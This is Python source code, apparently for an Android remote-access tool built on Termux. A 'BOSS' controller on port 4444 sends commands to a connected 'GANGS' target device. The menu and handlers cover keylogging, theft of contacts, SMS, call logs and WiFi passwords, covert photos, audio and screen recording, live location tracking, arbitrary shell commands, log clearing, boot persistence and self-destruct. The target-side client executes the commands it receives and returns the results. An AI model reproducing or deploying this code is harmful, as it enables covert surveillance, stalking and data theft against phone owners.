    print(f"{YELLOW}[36]{RESET} Take Photo")
    print(f"{YELLOW}[37]{RESET} Record Audio")
    print(f"{YELLOW}[38]{RESET} Get Location")
    print(f"{YELLOW}[39]{RESET} Get Location with Map Link")
    print(f"{YELLOW}[40]{RESET} Get Detailed Location")
    print(f"{YELLOW}[41]{RESET} Save Location to File")
    print(f"{YELLOW}[42]{RESET} Continuous Location Tracking")
    print(f"{YELLOW}[43]{RESET} Get WiFi Passwords")
    print(f"{YELLOW}[44]{RESET} Make Call")
    print(f"{YELLOW}[45]{RESET} Send SMS")
    print(f"{YELLOW}[46]{RESET} Vibrate Device")
    print(f"{YELLOW}[47]{RESET} Lock Device")
    print(f"{YELLOW}[48]{RESET} Set Volume")
    print(f"{YELLOW}[49]{RESET} Screenshot")
    print(f"{YELLOW}[50]{RESET} Screenshot with Timestamp")
    print(f"{YELLOW}[51]{RESET} Screenshot Loop")
    print(f"{YELLOW}[52]{RESET} Screenshot with Details")
    print(f"{YELLOW}[53]{RESET} Screen Record")
    print(f"{YELLOW}[54]{RESET} Process List")
    print(f"{YELLOW}[55]{RESET} Kill Process")
    print(f"{YELLOW}[56]{RESET} CPU Info")
    print(f"{YELLOW}[57]{RESET} Memory Info")
    print(f"{YELLOW}[58]{RESET} Clear Logs")
    print(f"{YELLOW}[59]{RESET} Auto-Start on Boot")
    print(f"{YELLOW}[60]{RESET} Persistent Connection")
    print(f"{YELLOW}[61]{RESET} Self Destruct")
    print(f"{YELLOW}[62]{RESET} Volume Status")
    print(f"{YELLOW}[63]{RESET} Set Volume by Percentage")
    print(f"{YELLOW}[64]{RESET} Volume Up (+10%)")
    print(f"{YELLOW}[65]{RESET} Volume Down (-10%)")
    print(f"{YELLOW}[66]{RESET} Volume Max (100%)")
    print(f"{YELLOW}[67]{RESET} Volume Min (0%)")
    print(f"{YELLOW}[68]{RESET} Mute Volume")
    print(f"{YELLOW}[69]{RESET} Unmute Volume")
    print(f"{YELLOW}[70]{RESET} Smooth Volume Up")
    print(f"{YELLOW}[71]{RESET} Smooth Volume Down")
    print(f"{YELLOW}[72]{RESET} Volume Jump Up")
    print(f"{YELLOW}[73]{RESET} Volume Jump Down")
    print(f"{YELLOW}[74]{RESET} Volume Fade Out")
    print(f"{YELLOW}[75]{RESET} Volume Fade In")
    print(f"{YELLOW}[76]{RESET} Set Specific Stream Volume")
    print(f"{YELLOW}[77]{RESET} Make Phone Ring")
    print(f"{YELLOW}[78]{RESET} Stop Ringing")
    print(f"{YELLOW}[79]{RESET} Ring with Pattern")
    print(f"{YELLOW}[80]{RESET} Emergency Ring")
    print(f"{YELLOW}[81]{RESET} Ring with Flashlight")
    print(f"{YELLOW}[82]{RESET} SOS Ring Pattern")
    print(f"{YELLOW}[83]{RESET} Custom Ring (5x)")
    print(f"{YELLOW}[84]{RESET} Max Volume Ring")
    print(f"{YELLOW}[85]{RESET} Continuous Ring (Loop)")
    print(f"{YELLOW}[86]{RESET} Exit")
    print(f"{YELLOW}════════════════════════════════════════════════════════{RESET}")

def BOSS():
    print(f"\n{YELLOW}[*] Checking permissions...{RESET}")
    check_permissions()
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(60)
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    
    local_ip = get_local_ip()
    all_ips = get_all_ips()
    
    print(f"\n{GREEN}[+] {TOOL_NAME} Remote Controller{RESET}")
    print(f"{CYAN}╔═══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║ {BOLD}SERVER INFORMATION{RESET}")
    print(f"{CYAN}╠═══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║ {BOLD}Port:{RESET} {YELLOW}4444{RESET}")
    print(f"{CYAN}║ {BOLD}Status:{RESET} {GREEN}Listening{RESET}")
    print(f"{CYAN}╠═══════════════════════════════════════════════════════════╣{RESET}")
    print(f"{CYAN}║ {BOLD}Available IP Addresses:{RESET}")
    for iface, ip in all_ips:
        if ip == local_ip:
            print(f"{CYAN}║   {GREEN}▶ {iface}: {YELLOW}{ip} {GREEN}(Primary){RESET}")
        else:
            print(f"{CYAN}║   {WHITE}▶ {iface}: {YELLOW}{ip}{RESET}")
    print(f"{CYAN}╚═══════════════════════════════════════════════════════════╝{RESET}")
    
    print(f"\n{YELLOW}[*] Give this IP to the target device to connect{RESET}")
    print(f"{YELLOW}[*] Primary IP: {GREEN}{local_ip}{RESET}")
    print(f"{YELLOW}[*] Port: {GREEN}4444{RESET}")
    print(f"\n{YELLOW}[*] Waiting for Gangs (target) to connect...{RESET}")
    
    try:
        conn, addr = server.accept()
    except socket.timeout:
        print(f"{RED}[-] Connection timeout. Restarting...{RESET}")
        server.close()
        return
    
    print(f"\n{GREEN}╔════════════════════════════════════════╗{RESET}")
    print(f"{GREEN}║   GANGS TARGET CONNECTED!              ║{RESET}")
    print(f"{GREEN}║   IP: {addr[0]:<26}║{RESET}")
    print(f"{GREEN}║   Port: {str(addr[1]):<24}║{RESET}")
    print(f"{GREEN}╚════════════════════════════════════════╝{RESET}\n")
    
    conn.settimeout(30)
    
    while True:
        show_menu()
        choice = input(f"{BOLD}{RED}BOSS> {RESET}").strip()
        
        if choice == '1':
            conn.send(b'sysinfo')
            print(f"\n{YELLOW}[*] Fetching device intel...{RESET}")
            try:
                output = conn.recv(32768).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout receiving data{RESET}")
            
        elif choice == '2':
            msg = input(f"{YELLOW}[?] Message to speak on target: {RESET}")
            conn.send(f"alert:{msg}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '3':
            file_path = input(f"{YELLOW}[?] File path on target: {RESET}")
            conn.send(f"download:{file_path}".encode())
            try:
                output = conn.recv(16384).decode()
                print(f"\n{CYAN}╔════════════════════════════════════════╗{RESET}")
                print(f"{CYAN}║         FILE CONTENT                   ║{RESET}")
                print(f"{CYAN}╚════════════════════════════════════════╝{RESET}")
                print(f"\n{output}\n")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '4':
            note_text = input(f"{YELLOW}[?] Popup text for target: {RESET}")
            conn.send(f"popup:{note_text}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '5':
            conn.send(b'apps')
            print(f"\n{YELLOW}[*] Listing apps on target...{RESET}")
            try:
                output = conn.recv(32768).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '6':
            conn.send(b'battery')
            print(f"\n{YELLOW}[*] Checking target battery & storage...{RESET}")
            try:
                output = conn.recv(8192).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '7':
            conn.send(b'logs')
            print(f"\n{YELLOW}[*] Fetching target logs...{RESET}")
            try:
                output = conn.recv(16384).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '8':
            cmd = input(f"{BOLD}{RED}$ {RESET}")
            if cmd.strip() == "": continue
            conn.send(f"cmd:{cmd}".encode())
            try:
                output = conn.recv(16384).decode()
                print(f"\n{output}\n")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '9':
            conn.send(b'flash_on')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '10':
            conn.send(b'flash_off')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '11':
            conn.send(b'flash_toggle')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '12':
            conn.send(b'flicker')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '13':
            conn.send(b'flick_speed:0.05')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '14':
            conn.send(b'flick_speed:0.5')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '15':
            conn.send(b'disco')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '16':
            conn.send(b'sos')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '17':
            conn.send(b'screen_flicker')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '18':
            conn.send(b'screen_speed:0.05')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '19':
            conn.send(b'screen_speed:0.5')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '20':
            conn.send(b'screen_disco')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '21':
            conn.send(b'screen_sos')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '22':
            conn.send(b'flicker_combo')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '23':
            query = input(f"{YELLOW}[?] Google search query: {RESET}")
            conn.send(f"google:{query}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '24':
            query = input(f"{YELLOW}[?] YouTube search query: {RESET}")
            conn.send(f"youtube:{query}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '25':
            conn.send(b'youtube_trending')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '26':
            query = input(f"{YELLOW}[?] Image search query: {RESET}")
            conn.send(f"images:{query}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '27':
            query = input(f"{YELLOW}[?] News search query: {RESET}")
            conn.send(f"news:{query}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '28':
            query = input(f"{YELLOW}[?] Search query for both: {RESET}")
            conn.send(f"searchboth:{query}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '29':
            conn.send(b'search_history')
            try:
                output = conn.recv(4096).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '30':
            video_id = input(f"{YELLOW}[?] YouTube Video ID: {RESET}")
            conn.send(f"play:{video_id}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '31':
            conn.send(b'keylogger_start')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '32':
            conn.send(b'keylogger_stop')
            try:
                output = conn.recv(4096).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '33':
            conn.send(b'contacts')
            print(f"\n{YELLOW}[*] Fetching contacts...{RESET}")
            try:
                output = conn.recv(16384).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '34':
            conn.send(b'sms')
            print(f"\n{YELLOW}[*] Fetching SMS...{RESET}")
            try:
                output = conn.recv(16384).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '35':
            conn.send(b'calllogs')
            print(f"\n{YELLOW}[*] Fetching call logs...{RESET}")
            try:
                output = conn.recv(16384).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '36':
            conn.send(b'photo')
            print(f"\n{YELLOW}[*] Taking photo...{RESET}")
            try:
                output = conn.recv(16384).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '37':
            duration = input(f"{YELLOW}[?] Recording duration (seconds): {RESET}")
            conn.send(f"record:{duration}".encode())
            try:
                output = conn.recv(16384).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '38':
            conn.send(b'location')
            print(f"\n{YELLOW}[*] Getting current location...{RESET}")
            try:
                output = conn.recv(4096).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '39':
            conn.send(b'location_link')
            print(f"\n{YELLOW}[*] Getting location with map link...{RESET}")
            try:
                output = conn.recv(4096).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '40':
            conn.send(b'location_details')
            print(f"\n{YELLOW}[*] Getting detailed location...{RESET}")
            try:
                output = conn.recv(4096).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '41':
            conn.send(b'location_save')
            print(f"\n{YELLOW}[*] Saving location to file...{RESET}")
            try:
                output = conn.recv(4096).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '42':
            conn.send(b'location_track')
            print(f"\n{YELLOW}[*] Starting continuous tracking...{RESET}")
            print(f"{CYAN}[*] Press Ctrl+C to stop tracking{RESET}")
            try:
                while True:
                    try:
                        output = conn.recv(4096).decode()
                        print(f"\n{output}")
                        time.sleep(5)
                        conn.send(b'location_track')
                    except socket.timeout:
                        print(f"{YELLOW}[!] Waiting for location data...{RESET}")
                        continue
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[*] Tracking stopped{RESET}")
            
        elif choice == '43':
            conn.send(b'wifipass')
            print(f"\n{YELLOW}[*] Extracting WiFi passwords...{RESET}")
            try:
                output = conn.recv(4096).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '44':
            number = input(f"{YELLOW}[?] Phone number to call: {RESET}")
            conn.send(f"call:{number}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '45':
            number = input(f"{YELLOW}[?] Phone number: {RESET}")
            message = input(f"{YELLOW}[?] SMS message: {RESET}")
            conn.send(f"sendsms:{number},{message}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '46':
            duration = input(f"{YELLOW}[?] Vibrate duration (ms): {RESET}")
            conn.send(f"vibrate:{duration}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '47':
            conn.send(b'lock')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '48':
            level = input(f"{YELLOW}[?] Volume level (0-15): {RESET}")
            conn.send(f"volume:{level}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '49':
            conn.send(b'screenshot')
            print(f"\n{YELLOW}[*] Taking screenshot...{RESET}")
            try:
                output = conn.recv(16384).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '50':
            conn.send(b'screenshot_timestamp')
            print(f"\n{YELLOW}[*] Taking screenshot with timestamp...{RESET}")
            try:
                output = conn.recv(1024).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '51':
            count = input(f"{YELLOW}[?] Number of screenshots: {RESET}") or "5"
            conn.send(f"screenshot_loop:{count}".encode())
            print(f"\n{YELLOW}[*] Taking {count} screenshots...{RESET}")
            try:
                output = conn.recv(1024).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '52':
            conn.send(b'screenshot_full')
            print(f"\n{YELLOW}[*] Taking screenshot with details...{RESET}")
            try:
                output = conn.recv(1024).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '53':
            duration = input(f"{YELLOW}[?] Screen record duration (seconds): {RESET}")
            conn.send(f"screenrecord:{duration}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '54':
            conn.send(b'processes')
            print(f"\n{YELLOW}[*] Fetching process list...{RESET}")
            try:
                output = conn.recv(16384).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '55':
            pid = input(f"{YELLOW}[?] Process ID to kill: {RESET}")
            conn.send(f"kill:{pid}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '56':
            conn.send(b'cpu')
            print(f"\n{YELLOW}[*] Fetching CPU info...{RESET}")
            try:
                output = conn.recv(4096).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '57':
            conn.send(b'memory')
            print(f"\n{YELLOW}[*] Fetching memory info...{RESET}")
            try:
                output = conn.recv(4096).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '58':
            conn.send(b'clearlogs')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '59':
            conn.send(b'autostart')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '60':
            conn.send(b'persistent')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '61':
            confirm = input(f"{RED}[!] Are you sure? Type 'yes' to confirm: {RESET}")
            if confirm.lower() == 'yes':
                conn.send(b'selfdestruct')
                print(f"{RED}[*] Self-destruct command sent. Target will destroy itself.{RESET}")
                break
            else:
                print(f"{YELLOW}[*] Self-destruct cancelled.{RESET}")
        
        elif choice == '62':
            conn.send(b'volume_status')
            print(f"\n{YELLOW}[*] Getting volume status...{RESET}")
            try:
                output = conn.recv(4096).decode()
                print(f"\n{output}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '63':
            percent = input(f"{YELLOW}[?] Enter volume percentage (0-100): {RESET}")
            conn.send(f"volume_percent:{percent}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '64':
            conn.send(b'volume_up')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '65':
            conn.send(b'volume_down')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '66':
            conn.send(b'volume_max')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '67':
            conn.send(b'volume_min')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '68':
            conn.send(b'volume_mute')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '69':
            conn.send(b'volume_unmute')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '70':
            target = input(f"{YELLOW}[?] Target percentage (0-100): {RESET}")
            conn.send(f"volume_smooth_up:{target}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '71':
            target = input(f"{YELLOW}[?] Target percentage (0-100): {RESET}")
            conn.send(f"volume_smooth_down:{target}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '72':
            jump = input(f"{YELLOW}[?] Jump up percentage: {RESET}")
            conn.send(f"volume_jump_up:{jump}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '73':
            jump = input(f"{YELLOW}[?] Jump down percentage: {RESET}")
            conn.send(f"volume_jump_down:{jump}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '74':
            conn.send(b'volume_fadeout')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '75':
            conn.send(b'volume_fadein')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '76':
            stream = input(f"{YELLOW}[?] Stream (music/ring/alarm/notification/call): {RESET}")
            level = input(f"{YELLOW}[?] Level (0-15): {RESET}")
            conn.send(f"volume_type:{stream},{level}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")
            
        elif choice == '77':
            conn.send(b'ring')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '78':
            conn.send(b'ring_stop')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '79':
            duration = input(f"{YELLOW}[?] Ring duration (seconds): {RESET}")
            conn.send(f"ring_pattern:{duration}".encode())
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '80':
            conn.send(b'ring_emergency')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '81':
            conn.send(b'ring_with_flash')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '82':
            conn.send(b'ring_sos')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '83':
            conn.send(b'ring_custom')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '84':
            conn.send(b'ring_volume_max')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '85':
            conn.send(b'ring_loop')
            try:
                output = conn.recv(1024).decode()
                print(f"{GREEN}[+] {output}{RESET}")
                print(f"{YELLOW}[*] Use option 78 to stop ringing{RESET}")
            except socket.timeout:
                print(f"{RED}[-] Timeout{RESET}")

        elif choice == '86':
            conn.send(b'exit')
            print(f"{RED}[*] Disconnecting target{RESET}")
            break
        else:
            print(f"{RED}[-] Invalid option! Choose 1-86{RESET}")
            
    try:
        conn.close()
    except:
        pass
    server.close()
    print(f"{RED}[*] Server shutdown{RESET}")

def GANGS():
    print(f"\n{YELLOW}[*] Checking permissions...{RESET}")
    check_permissions()
    
    print(f"\n{CYAN}╔═══════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║ {BOLD}TARGET CONNECTION SETUP{RESET}")
    print(f"{CYAN}╚═══════════════════════════════════════════════════════════╝{RESET}")
    
    server_ip = input(f"{YELLOW}[?] Enter BOSS Server IP: {RESET}").strip()
    if not server_ip:
        print(f"{RED}[-] No IP provided. Exiting...{RESET}")
        return
    port = 4444
    
    print(f"{CYAN}[*] Connecting to {server_ip}:{port}...{RESET}")
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(30)
    try:
        client.connect((server_ip, port))
        print(f"{GREEN}[+] Connected to {TOOL_NAME} Remote Controller{RESET}")
        print(f"{GREEN}[+] Server: {server_ip}:{port}{RESET}")
        print(f"{YELLOW}[*] Waiting for commands...{RESET}")
    except Exception as e:
        print(f"{RED}[-] Connection Failed: {e}{RESET}")
        return
    
    while True:
        try:
            data = client.recv(4096).decode().strip()
            if not data or data == 'exit':
                break
            
            if data == 'sysinfo':
                cmd = """
                echo ' Brand         : ' $(getprop ro.product.brand 2>/dev/null || echo 'Unknown')
                echo ' Model         : ' $(getprop ro.product.model 2>/dev/null || echo 'Unknown')
                echo ' Device Code   : ' $(getprop ro.product.device 2>/dev/null || echo 'Unknown')
                echo ' Android Ver   : ' $(getprop ro.build.version.release 2>/dev/null || echo 'Unknown')
                echo ' Architecture  : ' $(uname -m 2>/dev/null || echo 'Unknown')
                echo ' Total RAM     : ' $(free -h 2>/dev/null | awk '/Mem:/ {print $2}' || echo 'Unknown')
                echo ' Free RAM      : ' $(free -h 2>/dev/null | awk '/Mem:/ {print $4}' || echo 'Unknown')
                echo ' Network Type  : ' $(getprop gsm.network.type 2>/dev/null || echo 'Wi-Fi / Mobile Data')
                echo ' SIM Operator  : ' $(getprop gsm.operator.alpha 2>/dev/null || echo 'Not Available')
                echo ' IP Address    : ' $(ifconfig wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' || hostname -I 2>/dev/null || echo 'Unknown')
                """
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                
            elif data.startswith('alert:'):
                msg = data.split('alert:')[1]
                stdout, stderr, code = termux_cmd("termux-tts-speak", [msg], timeout=10)
                if code == 0:
                    output = b"Voice alert executed on target"
                else:
                    output = f"Voice alert failed: {stderr}".encode()
                
            elif data.startswith('download:'):
                file_path = data.split('download:')[1]
                try:
                    with open(file_path, 'rb') as f:
                        output = f.read()
                except Exception as file_err:
                    output = f"File Read Error: {str(file_err)}".encode()
                    
            elif data.startswith('popup:'):
                note_content = data.split('popup:')[1]
                stdout, stderr, code = termux_cmd("termux-notification", ["--title", f"{TOOL_NAME} Alert", "--content", note_content], timeout=10)
                if code == 0:
                    output = b"Popup notification displayed on target"
                else:
                    output = f"Popup failed: {stderr}".encode()
                
            elif data == 'apps':
                try:
                    app_cmd = "pm list packages -f 2>/dev/null | head -50"
                    output = subprocess.check_output(app_cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not list apps"
                
            elif data == 'battery':
                stdout, stderr, code = termux_cmd("termux-battery-status", timeout=10)
